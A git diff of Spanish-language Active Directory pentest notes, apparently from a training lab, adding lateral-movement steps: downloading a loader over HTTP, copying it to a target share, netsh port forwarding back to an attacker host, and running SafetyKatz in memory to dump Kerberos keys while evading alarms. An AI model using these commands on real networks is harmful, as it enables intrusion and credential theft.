@@ -295,7 +295,7 @@ Y podremos acceder a ella usando
 Enter-PSSession -ComputerName target
 ```
 
-Para que sea mas **OPSEC** y evitar hacer saltar las alarmar usaremos
+Para que sea mas **OPSEC** y evitar hacer saltar las alarmas usaremos
 ```sehll
 Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access
 ```
@@ -321,9 +321,24 @@ En caso de que haya algun usuario conectado podemos acceder a el usando winrm
 winrs -r:dcorp-mgmt cmd /c "set computername && set username"
 ```
 
-En ese ususario le podemos cargar el *Loader* para copiarle el *safetyKatz*
+En ese ususario le podemos cargar el *Loader*  a la maquina en la que estamos para copiarle el *safetyKatz*
 ```shell
 iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
+```
+
+Y ahora le copiamos el *Loader* desde la maquina en la que estamos a la maquina objetivo que hemos enumerado con *Find-DomainUserLocation*
+```shell
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+```
+
+Para poder ejecutar herramientas tendremos que hacer el reenvio de puertos
+```shell
+$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97"
+```
+
+Ahora ya podremos ejecutar en memoria *SafetyKatz*
+```shell
+$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
 ```
 
 #### Uncosntrained delegation
@@ -337,7 +352,6 @@ Y ahora buscaremos los ususarios que tengan *Unconstrained delegation*
 Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
 ```
 
-Y
 #### Permisos GenericWrite
 ```shell
 Find-InterestingDomainACL -ResolveGUIDs | 
